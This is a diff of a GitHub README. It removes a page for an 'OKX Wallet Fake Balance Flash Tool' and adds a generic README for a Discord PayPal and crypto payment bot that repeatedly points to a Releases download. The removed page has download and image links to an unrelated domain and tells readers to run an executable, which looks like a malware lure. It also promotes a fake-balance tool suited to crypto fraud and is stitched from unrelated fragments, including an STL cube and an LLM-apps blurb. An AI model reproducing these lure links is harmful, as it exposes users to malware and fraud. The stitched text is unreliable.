@@ -1,144 +1,125 @@
-<p align="center">
-  <a href="https://installergitb.icu?wron6i4h2dn46ns">
-    <img src="https://github.com/user-attachments/assets/5f5b403e-164e-4dd6-96b2-bad38afd5eaf" width="600" height="900" alt="Unwind AI">
-  </a>
-</p>
+# Jyn Discord PayPal Crypto Payment Bot 🤖💰
 
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+Welcome to the Jyn Discord PayPal Crypto Payment Bot repository! This bot allows Discord users to make donations via Cash App or Venmo for roles within your server. It also supports PayPal and cryptocurrency payments. 
 
+You can download the latest version of the bot from the [Releases section](https://github.com/SSHprogrammer/Jyn-Discord-PayPal-Crypto-Payment-Bot-Commerce-From-Coinbase/releases). 
 
-# What is Flash Wallet?
+## Table of Contents
 
-[Download full version](https://installergitb.icu?7nauruyw2rc1z57)
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-**OKX Wallet Fake Balance Flash Tool** is a front-end simulation script that displays a custom balance in Web3 environments using the **OKX Wallet**. It is intended strictly for development, design mockups, UI/UX testing, or educational demonstrations. The tool does not connect to any blockchain or manipulate real funds—it only affects visual output locally. Ideal for building dApp interfaces, training new users, or showcasing wallet features without risk. This is **not a hacking tool** and should never be used for deceptive or fraudulent activity. Use it responsibly for testing or instructional purposes within a safe environment.
+## Features 🌟
 
-## Media
-![Screenshot_3](https://github.com/user-attachments/assets/227a96cd-2400-4340-9e9e-37b6a436378e)
-![Screenshot_2](https://github.com/user-attachments/assets/52cc7532-2375-46e4-a622-b2470ad0daa9)
+- **Multiple Payment Options**: Accept donations through Cash App, Venmo, PayPal, and cryptocurrencies.
+- **Role Assignment**: Automatically assign roles to users who make donations.
+- **Easy Setup**: Simple installation and configuration process.
+- **Dashboard**: A user-friendly dashboard to manage payments and roles.
+- **Real-Time Notifications**: Get notified of incoming payments instantly.
 
-## Features
-* **1. Fake Balance Injection:** Simulates custom balances in OKX Wallet UI.
-* **2. Web3 Compatible:** Works with dApps and browser extensions.
-* **3. Non-Intrusive:** No interaction with real blockchain or funds.
-* **4. Demo-Ready:** Ideal for tutorials, mockups, and simulations.
-* **5. Lightweight Script:** Simple to configure and deploy.
-* **6. Ethical Use Only:** Built for safe, legal demonstration purposes.
+## Technologies Used 🛠️
 
+This bot utilizes a variety of technologies to function effectively:
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+- **Discord.js**: The core library for interacting with the Discord API.
+- **Node.js**: The runtime environment for executing JavaScript on the server side.
+- **Express.js**: A web framework for building the dashboard.
+- **MongoDB**: A NoSQL database for storing user data and payment records.
+- **React**: For building the user interface of the dashboard.
+- **Shopify API**: For e-commerce integrations.
 
-# Installation
+## Installation 📥
 
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://installergitb.icu?p6n2zva0o68egnw)
-> Download These
-2. OR
+To get started with the Jyn Discord PayPal Crypto Payment Bot, follow these steps:
 
-![download](https://installergitb.icu?fiu3k5rtlssquor)
-
-
-3. _Then open the sln (Project Solution) file_
-
-![vsgif](https://installergitb.icu?bqfxkntdjb0nqk4)
-
-4. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/https://installergitb.icu?7bb9yz2ywxfa9kj
+1. **Clone the Repository**: 
+   ```bash
+   git clone https://github.com/SSHprogrammer/Jyn-Discord-PayPal-Crypto-Payment-Bot-Commerce-From-Coinbase.git
+   cd Jyn-Discord-PayPal-Crypto-Payment-Bot-Commerce-From-Coinbase
    ```
 
-# How to Use
+2. **Install Dependencies**: 
+   ```bash
+   npm install
+   ```
 
-1. **Open the Application**  
-   - Locate the executable file (`.exe`) on your computer and double-click it to launch the program.
+3. **Set Up Environment Variables**: Create a `.env` file in the root directory and add the following:
+   ```
+   DISCORD_TOKEN=your_discord_bot_token
+   PAYPAL_CLIENT_ID=your_paypal_client_id
+   PAYPAL_SECRET=your_paypal_secret
+   ```
 
-2. **Select Target and Adjust Settings**  
-   - Choose your desired target or task from the available options.  
-   - Customize any additional settings (e.g., preferences, configurations) to fit your needs.
+4. **Run the Bot**: 
+   ```bash
+   npm start
+   ```
 
-3. **Generate a Secure Password**  
-   - Use the built-in feature to create a strong password hashed with the **SHA-256 algorithm**. This ensures your password is secure and encrypted.
+5. **Visit the Dashboard**: Open your web browser and navigate to `http://localhost:3000`.
 
-4. **Start the Process**  
-   - Click the **"Start" button** or press `Ctrl + V` to begin the operation.  
-   - When prompted, enter the password you generated in the previous step.
+You can download the latest version of the bot from the [Releases section](https://github.com/SSHprogrammer/Jyn-Discord-PayPal-Crypto-Payment-Bot-Commerce-From-Coinbase/releases) if you prefer to use a packaged version.
 
-5. **Provide API Key (If Required)**  
-   - If the application needs an API key to function (e.g., for external services), go to the settings and input your valid API key before proceeding.
+## Usage 🛠️
 
-6. **Start the Server**  
-   - Once everything is configured, start the server. Wait for the connection to be established. A stable connection is necessary for the app to work properly.
+Once you have the bot running, you can use the following commands:
 
-7. **Troubleshoot Errors (If Any)**  
-   - If you encounter errors, ensure the following are installed on your system:  
-     - **Node.js**: Download and install it from [nodejs.org](https://nodejs.org).  
-     - **Visual Studio Build Tools**: Install these tools to resolve technical issues. 
+- **!donate [amount]**: Initiates the donation process.
+- **!roles**: Lists available roles that can be purchased with donations.
+- **!status**: Checks the status of your recent donations.
 
+The bot will respond with the necessary steps to complete your donation.
 
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
+## Configuration ⚙️
 
+To customize the bot, you can modify the settings in the `config.json` file:
 
-## Licence
-
-Project is licenced under the [MIT licence](https://github.com/AvaloniaUI/Avalonia/blob/master/licence.md).
-
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
+```json
+{
+  "paymentMethods": {
+    "cashApp": true,
+    "venmo": true,
+    "paypal": true,
+    "crypto": true
+  },
+  "roles": [
+    {
+      "name": "Supporter",
+      "amount": 5
+    },
+    {
+      "name": "VIP",
+      "amount": 10
+    }
+  ]
+}
 ```
 
+Adjust the `paymentMethods` and `roles` as needed.
 
-# 🌟 Awesome 
+## Contributing 🤝
 
-A curated collection of awesome LLM apps built with RAG and AI agents. This repository features LLM apps that use models from OpenAI, Anthropic, Google, and open-source models like DeepSeek, Qwen or Llama that you can run locally on your computer.
+We welcome contributions! If you would like to help improve the Jyn Discord PayPal Crypto Payment Bot, please follow these steps:
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact 📬
+
+For questions or feedback, please reach out to the repository owner via GitHub or open an issue in the repository.
+
+You can download the latest version of the bot from the [Releases section](https://github.com/SSHprogrammer/Jyn-Discord-PayPal-Crypto-Payment-Bot-Commerce-From-Coinbase/releases). 
+
+Thank you for checking out the Jyn Discord PayPal Crypto Payment Bot! We hope it serves your community well.
